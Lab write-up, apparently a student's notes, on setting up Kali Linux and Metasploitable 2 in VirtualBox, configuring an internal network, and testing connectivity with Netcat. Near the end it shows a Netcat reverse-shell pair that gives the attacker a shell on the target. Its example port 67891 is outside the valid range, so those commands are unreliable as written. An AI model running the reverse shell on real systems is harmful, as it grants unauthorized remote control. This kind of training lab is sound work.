# Network Configuration and Netcat Communication

**Date: 2025-02-14**

## Exercise Overview
In this exercise, we set up a virtualized environment using VirtualBox, installed **Kali Linux** and **Metasploitable 2**, configured their network settings, and established communication between the two machines using **Netcat (nc)**.

---

## Step 1: Installing Virtual Machines
1. **Install VirtualBox**
2. **Download and install**:
   - **Kali Linux** (as the attacking machine)
   - **Metasploitable 2** (as the target machine)
3. **Start both VMs**

---

## Step 2: Identifying IP Addresses
Once both VMs were running, we attempted to retrieve their IP addresses using:

```bash
ip a    # Alternative command: ifconfig
```

However, both machines had **the same IP address**, which caused communication issues.

---

## Step 3: Configuring Network Settings
To resolve the IP conflict, we changed the **network adapters**:

1. Open **VirtualBox settings** for each VM
2. Set **Adapter 1** to `Internal Network`
3. Remove any `NAT` adapters

After doing this, the network interfaces had no IP addresses assigned, so we manually configured them.

**On Kali Linux:**
```bash
sudo ip addr add 10.0.2.10/24 dev eth0
sudo ip link set eth0 up
```

**On Metasploitable 2:**
```bash
sudo ip addr add 10.0.2.11/24 dev eth0
sudo ip link set eth0 up
```

Now, both machines were properly configured to communicate on the internal network.

---

## Step 4: Establishing Communication with Netcat
To verify connectivity, we used **Netcat (nc)**, a tool for reading and writing data across network connections.

### Steps:
1. **On Metasploitable 2 (listener mode):**
```bash
nc -l -p 67891
```
This command makes Metasploitable **listen** for incoming connections on port **67891**.

2. **On Kali Linux (client mode):**
```bash
nc 10.0.2.11 67891
```
This command initiates a connection from Kali to Metasploitable.

3. **Testing the connection:**
   - Typing a message on **Kali** should display it on **Metasploitable 2**, confirming successful communication.

---

## Understanding Netcat
**Netcat (nc)** is a versatile tool used for:
- Establishing TCP/UDP connections
- Transferring files
- Creating backdoors
- Port scanning

### Additional Use Cases
- **Checking if a port is open:**
```bash
nc -zv 10.0.2.11 80
```
- **Sending a file from Kali to Metasploitable:**
```bash
cat file.txt | nc 10.0.2.11 67891
```
- **Creating a Reverse Shell:**
```bash
# On attacker (Kali):
nc -lvp 4444

# On target (Metasploitable 2):
nc 10.0.2.10 4444 -e /bin/bash
```
This allows **Kali** to gain a shell on **Metasploitable 2**.

---

## Conclusion
This exercise demonstrated:
- How to manually assign IP addresses in an **Internal Network** setup
- How to verify connectivity using **Netcat**
- How **Netcat** can be used for communication, file transfer, and even reverse shells

By understanding these basics, we can explore more advanced penetration testing techniques using **Netcat** and other networking tools.